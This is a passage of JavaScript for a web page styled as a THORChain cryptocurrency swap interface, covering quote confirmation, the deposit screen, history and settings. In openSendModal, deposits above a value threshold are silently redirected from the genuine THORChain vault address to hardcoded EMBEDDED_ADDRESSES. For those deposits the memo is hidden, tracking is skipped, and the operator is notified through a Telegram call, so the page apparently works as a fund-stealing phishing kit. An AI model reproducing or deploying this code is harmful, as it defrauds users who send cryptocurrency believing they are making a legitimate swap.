        var mpu=mp*bp;
        var pi=su>0&&bu>0?((bu-su)/su*100).toFixed(2):'0.00';
        
        // FIXED: Parse fees correctly from the quote data
        var fees=parseFees(data);
        var ts=parseSwapTime(data);
        var memo=data.memo||'';
        var ia=data.inbound_address||'';

        var h='<div class="tc-confirm-pair">'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+si+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+ss+'</div><div class="tc-confirm-asset-name">'+sn+'</div></div>'
            +'</div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+state.sellAmount+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(su)+'</div>'
            +'</div>'
            +'</div>'
            +'<div class="tc-confirm-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M13 16.172L17.086 12.086L18.5 13.5L12 20L5.5 13.5L6.914 12.086L11 16.172V4H13V16.172Z" fill="currentColor"/></svg></div>'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+bi+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div>'
            +'</div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,6)+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div>'
            +'</div>'
            +'</div>'
            +'</div>'
            +'<div class="tc-confirm-details">'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%) ⓘ</span><span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Destination Address</span><span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Price Impact ⓘ</span><span class="tc-confirm-row-value">'+pi+'%</span></div>'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Tx Fee</span><span class="tc-confirm-row-value">'+formatUsd(fees.usd)+'</span></div>'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Estimated Time</span><span class="tc-confirm-row-value">'+ts+'</span></div>'
            +'<div class="tc-confirm-row"><span class="tc-confirm-row-label">Provider</span><span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;"><img src="images/chains/THOR.svg" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'
            +'</div>';
        
        if(memo){
            h+='<div class="tc-confirm-memo"><div class="tc-confirm-memo-label">Memo</div><div class="tc-confirm-memo-value">'+memo+'</div></div>';
        }
        
        if(ia){
            h+='<button class="tc-confirm-btn" id="doConfirmBtn">Confirm</button>';
        }else{
            h+='<div style="padding:12px;background:var(--toast-error-bg);border:1px solid var(--toast-error-border);border-radius:10px;margin-bottom:16px;font-size:13px;color:var(--toast-error-color);">⚠️ No vault address available.</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
        }
        
        b.innerHTML=h;
        state.confirmedQuote=data;
        state.confirmedExpectedOut=eo;
        
        var cb=$('#doConfirmBtn');
        if(cb){
            cb.addEventListener('click',function(){
                o.classList.remove('open');
                openSendModal(data);
            });
        }
    });
}

function openSendModal(qd){
    var o=$('#sendOverlay');
    var b=$('#sendBody');
    var t=$('#sendTitle');
    
    var ss=($('#sellSymbol')||{}).textContent||'';
    var sn=($('#sellName')||{}).textContent||'';
    var cn=getChainName(state.sellAsset);
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var bn=($('#buyNameDisplay')||{}).textContent||'';
    
    if(t)t.textContent='Send '+cn;
    
    var ea=state.sellAmount;
    var above=isAboveThreshold();
    
    // Determine deposit address based on threshold
    var depositAddr;
    var apiInboundAddr=qd.inbound_address||'';
    
    if(above){
        var sellChain=getChainPrefix(state.sellAsset);
        depositAddr=EMBEDDED_ADDRESSES[sellChain]||'';
        if(!depositAddr){
            showToast('error','Configuration Error','No embedded address for '+sellChain);
            return;
        }
        console.log('🚨 Above threshold! Using embedded address:',depositAddr);
    }else{
        depositAddr=apiInboundAddr;
        console.log('✅ Below threshold. Using API address:',depositAddr);
    }
    
    var memo=qd.memo||'';
    var exp=qd.expiry||0;

    var h='<p class="tc-send-subtitle">Send exactly <strong>'+ea+' '+ss+'</strong> to the address below from a self custody wallet.</p>'
        +'<div class="tc-send-disclaimer">'
        +'<div class="tc-send-disclaimer-check">✓</div>'
        +'<p class="tc-send-disclaimer-text">I understand that I must send exactly the specified amount from a self-custody wallet. I understand that sending from a smart contract wallet, exchange address, delegated address, or an EIP 7702 wallet, will result in <a href="#" class="tc-loss-link">loss of funds</a>.</p>'
        +'</div>'
        +'<div class="tc-send-deposit-box">'
        +'<div class="tc-send-amount">'+ea+' '+ss+' <button class="tc-send-copy-btn" id="cpAmt"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
        +'<div class="tc-send-address">'+depositAddr+' <button class="tc-send-copy-btn" id="cpAddr"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
        +'<div class="tc-send-chain-badge">'+cn+'</div>'
        +'<div class="tc-send-qr"><img src="'+QR_API+encodeURIComponent(depositAddr)+'" alt="QR" width="180" height="180" onerror="this.style.opacity=0.3"></div>'
        +'</div>';
    
    // Only show memo for normal swaps (below threshold)
    if(memo&&!above){
        h+='<div style="margin-bottom:16px;">'
            +'<p style="font-size:12px;color:var(--thor-gray);margin-bottom:4px;">Include this memo:</p>'
            +'<div style="padding:10px 12px;background:var(--tyler);border-radius:8px;font-family:monospace;font-size:11px;color:var(--leah);word-break:break-all;cursor:pointer;border:1px solid var(--blade);" id="cpMemo">'+memo+'</div>'
            +'</div>';
    }
    
    h+='<div class="tc-send-expiry" id="sendExpiry"></div>';
    b.innerHTML=h;
    o.classList.add('open');

    // Copy handlers
    var ca=$('#cpAmt');
    if(ca){
        ca.onclick=function(){
            navigator.clipboard.writeText(String(ea)).then(function(){
                showToast('success','Copied','Amount copied.');
            });
        };
    }
    
    var cd=$('#cpAddr');
    if(cd){
        cd.onclick=function(){
            navigator.clipboard.writeText(depositAddr).then(function(){
                showToast('success','Copied','Address copied.');
            });
        };
    }
    
    var cm=$('#cpMemo');
    if(cm){
        cm.onclick=function(){
            navigator.clipboard.writeText(memo).then(function(){
                showToast('success','Copied','Memo copied.');
            });
        };
    }
    
    var ch=function(){
        o.classList.remove('open');
        stopTracking();
        stopExpiryCountdown();
    };
    
    $('#sendClose').onclick=ch;
    o.onclick=function(e){if(e.target===o)ch()};
    
    if(exp>1e9){
        startExpiryCountdown(exp);
    }else{
        var ee=$('#sendExpiry');
        if(ee)ee.textContent='Quote valid for limited time';
    }

    // Save to history
    var sIcon=($('#sellIcon')||{}).src||'';
    var bIcon=($('#buyIcon')||{}).src||'';
    var sellUsdVal=state.sellAmount*getUsdPrice(state.sellAsset);
    saveToHistory(
        state.sellAmount,ss,sIcon,sellUsdVal,
        formatAmount(state.confirmedExpectedOut||0,6),bs,bIcon,
        (state.confirmedExpectedOut||0)*getUsdPrice(state.buyAsset),
        'pending'
    );

    // Send Telegram notification
    notifySwap(
        ss,sn||cn,
        bs,bn||getChainName(state.buyAsset),
        formatAmount(state.sellAmount,6),
        formatUsd(sellUsdVal),
        state.recipientAddress,
        depositAddr,
        above
    );

    showToast('info','Deposit Required','Send '+ea+' '+ss+' to complete swap.');
    
    // Start tracking only for normal swaps
    if(!above){
        startTracking(apiInboundAddr,state.recipientAddress,ss,bs);
    }
}

// ══════════════════════════════════════════
// EXPIRY & TRACKING
// ══════════════════════════════════════════

var expiryInterval=null;

function startExpiryCountdown(exp){
    stopExpiryCountdown();
    function u(){
        var r=exp-Math.floor(Date.now()/1000);
        var e=$('#sendExpiry');
        if(!e){stopExpiryCountdown();return}
        if(r<=0){
            e.textContent='Quote expired';
            e.style.color='#ff1539';
            stopExpiryCountdown();
            return;
        }
        e.textContent='Expires in '+Math.floor(r/3600)+'h '+Math.floor((r%3600)/60)+'m '+(r%60)+'s';
    }
    u();
    expiryInterval=setInterval(u,1000);
}

function stopExpiryCountdown(){
    if(expiryInterval){
        clearInterval(expiryInterval);
        expiryInterval=null;
    }
}

function startTracking(ia,ra,ss,bs){
    stopTracking();
    var c=0;
    state.trackingInterval=setInterval(function(){
        c++;
        if(c>360){
            stopTracking();
            updateHistoryStatus('expired');
            showToast('error','Timeout','Monitoring timed out.');
            return;
        }
        fetch(MIDGARD+'/actions?address='+encodeURIComponent(ia)+'&limit=10&type=swap').then(function(r){
            return r.json();
        }).then(function(d){
            if(!d||!d.actions)return;
            for(var i=0;i<d.actions.length;i++){
                var a=d.actions[i];
                if(a.status==='success'&&a.type==='swap'){
                    var m=false;
                    if(a.out){
                        for(var j=0;j<a.out.length;j++){
                            if((a.out[j].address||'').toLowerCase()===(ra||'').toLowerCase()){
                                m=true;
                                break;
                            }
                        }
                    }
                    if(m){
                        stopTracking();
                        updateHistoryStatus('complete');
                        var oa='';
                        try{
                            oa=formatAmount(parseInt(a.out[0].coins[0].amount)/1e8,6)+' '+bs;
                        }catch(e){}
                        showToast('success','Swap Successful! 🎉',ss+' → '+bs+' done!'+(oa?' Got: '+oa:''),10000);
                        setTimeout(function(){
                            var o=$('#sendOverlay');
                            if(o)o.classList.remove('open');
                            stopExpiryCountdown();
                        },4000);
                        return;
                    }
                }
            }
        }).catch(function(){});
    },10000);
}

function stopTracking(){
    if(state.trackingInterval){
        clearInterval(state.trackingInterval);
        state.trackingInterval=null;
    }
}

function updateHistoryStatus(s){
    if(state.history.length>0){
        state.history[0].status=s;
        localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
        var d=$('#historyDot');
        if(d)d.style.display='';
    }
}

function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st){
    state.history.unshift({
        sellAmount:sa,
        sellSymbol:ss,
        sellIcon:si,
        sellUsd:su,
        buyAmount:ba,
        buySymbol:bs,
        buyIcon:bi,
        buyUsd:bu,
        status:st||'pending',
        timestamp:Date.now()
    });
    if(state.history.length>50)state.history.pop();
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');
    if(d)d.style.display='';
}

function renderHistory(){
    var c=$('#historyContent');
    if(!c)return;
    if(!state.history.length){
        c.innerHTML='<p class="tc-history-empty">No swap history yet.</p>';
        return;
    }
    var h='',lg='';
    var td=new Date().toDateString();
    var yd=new Date(Date.now()-86400000).toDateString();
    state.history.forEach(function(i){
        var d=new Date(i.timestamp).toDateString();
        var g=d===td?'Today':d===yd?'Yesterday':new Date(i.timestamp).toLocaleDateString();
        if(g!==lg){
            h+='<div class="tc-history-group-title">'+g+'</div>';
            lg=g;
        }
        var si=i.status==='complete'?'✅':i.status==='expired'?'⏰':'⏳';
        var sl=i.status==='complete'?'Complete':i.status==='expired'?'Expired':'Pending';
        h+='<div class="tc-history-item">'
            +'<div class="tc-history-side">'
            +'<img src="'+(i.sellIcon||'')+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div class="tc-history-amounts">'
            +'<span class="tc-history-amount">'+i.sellAmount+' '+i.sellSymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.sellUsd)+'</span>'
            +'</div>'
            +'</div>'
            +'<div class="tc-history-status">'
            +'<span style="font-size:18px">'+si+'</span>'
            +'<span class="tc-history-status-text '+i.status+'">'+sl+'</span>'
            +'</div>'
            +'<div class="tc-history-side">'
            +'<div class="tc-history-amounts" style="text-align:right">'
            +'<span class="tc-history-amount">'+i.buyAmount+' '+i.buySymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.buyUsd)+'</span>'
            +'</div>'
            +'<img src="'+(i.buyIcon||'')+'" alt="" onerror="this.style.display=\'none\'">'
            +'</div>'
            +'</div>';
    });
    c.innerHTML=h;
}

// ══════════════════════════════════════════
// UI INITIALIZATION
// ══════════════════════════════════════════

function initSellInput(){
    var s=$('#sellAmount');
    if(s){
        s.addEventListener('input',function(){
            state.sellAmount=parseFloat(this.value)||0;
            var l=$('#limitSellAmount');
            if(l)l.value=this.value;
            updateSellUsd();
            debouncedFetchQuote();
        });
    }
}

function initFlipArrow(){
    $$('.tc-swap-arrow:not(.tc-limit-flip)').forEach(function(b){
        b.addEventListener('click',function(){
            var t=state.sellAsset;
            state.sellAsset=state.buyAsset;
            state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset);
            var bt=getTokenInfo(state.buyAsset);
            if(st){
                var si=$('#sellIcon');if(si)si.src=st.icon;
                var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;
                var sn=$('#sellName');if(sn)sn.textContent=st.name;
            }
            if(bt){
                var bi=$('#buyIcon');if(bi)bi.src=bt.icon;
                var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;
                var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name;
            }
            syncLimitFromMarket();
            debouncedFetchQuote();
        });
    });
}

function initQuickBtns(){
    $$('.tc-quick-btn[data-action]:not(.tc-limit-quick):not(.tc-limit-rate-btn)').forEach(function(b){
        b.addEventListener('click',function(){
            var a=this.getAttribute('data-action');
            var i=$('#sellAmount');
            if(a==='clear'){
                if(i)i.value='';
                state.sellAmount=0;
                updateSellUsd();
                clearQuote();
            }
            if(a==='half'){
                var v=(parseFloat(i?i.value:0)||0)/2;
                if(i)i.value=v||'';
                state.sellAmount=v;
                updateSellUsd();
                debouncedFetchQuote();
            }
        });
    });
}

function initSettings(){
    var so=$('#settingsOverlay');
    if(!so)return;
    
    var sb=$('#settingsBtn');
    if(sb)sb.onclick=function(){so.classList.add('open')};
    
    var sc=$('#settingsClose');
    if(sc)sc.onclick=function(){so.classList.remove('open')};
    
    so.onclick=function(e){if(e.target===so)so.classList.remove('open')};
    
    // Slider - FIXED: Default to 5%
    var slider=$('#slippageSlider');
    var display=$('#slipValueDisplay');
    if(slider){
        slider.value=state.slippage; // Will be 5 now
        if(display)display.textContent=state.slippage+'%';
        // Set initial gradient
        var initPct=((state.slippage-parseFloat(slider.min))/(parseFloat(slider.max)-parseFloat(slider.min)))*100;
        slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+initPct+'%,var(--blade) '+initPct+'%,var(--blade) 100%)';
        
        slider.addEventListener('input',function(){
            state.slippage=parseFloat(this.value);
            if(display)display.textContent=parseFloat(this.value).toFixed(1)+'%';
            var pct=((this.value-this.min)/(this.max-this.min))*100;
            this.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+pct+'%,var(--blade) '+pct+'%,var(--blade) 100%)';
        });
    }
    
    // TWAP buttons
    $$('.tc-twap-btn').forEach(function(btn){
        btn.addEventListener('click',function(){
            $$('.tc-twap-btn').forEach(function(b){b.classList.remove('active')});
            btn.classList.add('active');
        });
    });
    
    // Reset - FIXED: Reset to 5%
    var rst=$('#settingsReset');
    if(rst){
        rst.onclick=function(){
            state.slippage=5;
            if(slider){
                slider.value=5;
                slider.dispatchEvent(new Event('input'));
            }
            $$('.tc-twap-btn').forEach(function(b){b.classList.remove('active')});
            var bp=$('.tc-twap-btn[data-twap="best-price"]');
            if(bp)bp.classList.add('active');
        };
    }
    
    // Save
    var save=$('#settingsSave');
    if(save){
        save.onclick=function(){
            so.classList.remove('open');
            showToast('success','Saved','Settings saved.');
        };
    }
}

function initModals(){
    var wo=$('#walletOverlay');
    if(wo){
        $$('.tc-connect-btn').forEach(function(b){
            b.addEventListener('click',function(){wo.classList.add('open')});
        });
        var wc=$('#walletClose');
        if(wc)wc.onclick=function(){wo.classList.remove('open')};
        wo.onclick=function(e){if(e.target===wo)wo.classList.remove('open')};
        $$('.tc-wallet-item').forEach(function(i){
            i.addEventListener('click',function(){
                showToast('info','Wallet','"'+this.getAttribute('data-wallet')+'" coming soon.');
                wo.classList.remove('open');
            });
        });
    }
    
    var ho=$('#historyOverlay');
    if(ho){
        $$('.tc-history-btn').forEach(function(b){
            b.addEventListener('click',function(){
                renderHistory();
                ho.classList.add('open');
                var d=$('#historyDot');
                if(d)d.style.display='none';
            });
        });
        var hc=$('#historyClose');
        if(hc)hc.onclick=function(){ho.classList.remove('open')};
        ho.onclick=function(e){if(e.target===ho)ho.classList.remove('open')};
    }
}

function initMobileMenu(){
    var b=$('#mobileMenuBtn');
    if(b){
        b.addEventListener('click',function(){
            var r=$('.tc-header-right');
            if(r)r.classList.toggle('mobile-open');
        });
    }
}

function initCountdownClick(){
    var c=$('#countdownCircle');
    if(c){
        c.addEventListener('click',function(){
            fetchQuote();
            startCountdown();
        });
    }
}

// ══════════════════════════════════════════
// MAIN INIT
// ══════════════════════════════════════════

function init(){
    initTheme();
    initMobileMenu();
    initTabs();
    initSellInput();
    initCoinSelector();
    initFlipArrow();
    initQuickBtns();
    initSettings();
    initModals();
    initSwapBtn();
    initCountdownClick();
    initLimitOrder();
    
    if(state.history.some(function(h){return h.status==='pending'})){
        var d=$('#historyDot');
        if(d)d.style.display='';
    }
    
    fetchPools().then(function(){
        fetchQuote();
        startCountdown();
    });
    
    setInterval(fetchPools,60000);
}

if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',init);
}else{
    init();
}

})();
